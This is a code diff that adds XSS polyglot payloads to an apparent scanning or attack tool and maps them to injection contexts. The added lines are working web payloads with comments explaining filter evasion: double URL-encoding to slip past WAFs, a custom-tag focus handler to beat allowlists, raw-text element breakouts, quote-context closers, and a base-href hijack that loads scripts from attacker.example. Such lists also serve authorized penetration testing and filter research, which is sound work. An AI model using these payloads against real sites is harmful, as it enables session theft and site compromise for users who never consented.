@@ -40,6 +40,44 @@ POLYGLOT_PAYLOADS = [
 
     # URL context polyglot  (href= / src= / action=)
     "javascript://%0aalert(document.domain)//<script>\nalert(1)</script>",
+
+    # Double URL-encoded scheme + optional-chaining call — %25 decodes to
+    # a literal %, so %250A only becomes a real newline after a SECOND
+    # decode pass. Survives WAFs/proxies that decode exactly once before
+    # matching signatures. `alert?.(1)` still invokes alert but fails
+    # silently (no throw) if alert were ever shadowed/undefined, so a
+    # blind mutation chain won't crash and reveal itself early.
+    "javascript://%250Aalert?.(1)//",
+
+    # Attribute "casting" via an unknown/custom tag name. contentEditable
+    # + autoFocus turn ANY element — including a made-up tag the app never
+    # allowlisted — into a focusable target, so the onfocus handler fires
+    # without needing svg/img/body/etc. Defeats tag-name allowlists that
+    # only strip known-dangerous tags.
+    "<k/contentEditable/autoFocus/OnFocus=alert(1)>",
+
+    # Raw-text/rawtext element closer chain. title/style/script/textarea/
+    # iframe/noscript all parse their contents as raw text until their own
+    # closing tag, so a normal payload placed inside one is inert. Closing
+    # all of them in sequence guarantees whichever one the input actually
+    # landed in gets terminated, then the trailing svg fires.
+    "</title></style></script></textarea></iframe></noscript>"
+    "<svg onload=alert(1)>",
+
+    # Quote/backtick/entity comment-closer chain. Covers unescaped and
+    # backslash-escaped single quote, double quote, and backtick, plus the
+    # HTML entity apostrophe, each opening a same-family comment/no-op —
+    # so whichever quoting style actually wraps the injection point lines
+    # up and neutralizes the rest of the original statement without
+    # needing to know the exact context in advance.
+    "//'/*\\'/*\"/*\\\"/*`/*\\`/*&apos;)/*<svg onload=alert(1)>",
+
+    # base-href hijack + trailing comment swallow. Redirects every
+    # subsequent relative-URL resource (scripts, images, forms) on the
+    # page to an attacker host, then opens a trailing HTML comment to
+    # absorb whatever markup follows. Useful when direct <script>/on*
+    # injection is stripped but <base> is not on the tag denylist.
+    '<base href="//attacker.example/"><script src="/x"></script><!--',
 ]
 
 # Context-detection probes (canary strings, one per context)
@@ -54,11 +92,11 @@ CONTEXT_PROBES = {
 
 # Map: context → best polyglot indices in POLYGLOT_PAYLOADS
 CONTEXT_PAYLOAD_MAP: dict[str, list[int]] = {
-    "html":        [1, 2, 6],
-    "attr_double": [3, 9, 1],
-    "attr_single": [3, 2, 9],
-    "js_string":   [3, 0, 4],
-    "url":         [9, 0],
+    "html":        [1, 2, 6, 11, 12, 14],
+    "attr_double": [3, 9, 1, 13],
+    "attr_single": [3, 2, 9, 13],
+    "js_string":   [3, 0, 4, 13],
+    "url":         [9, 0, 10],
     "css":         [0, 6],
 }
 
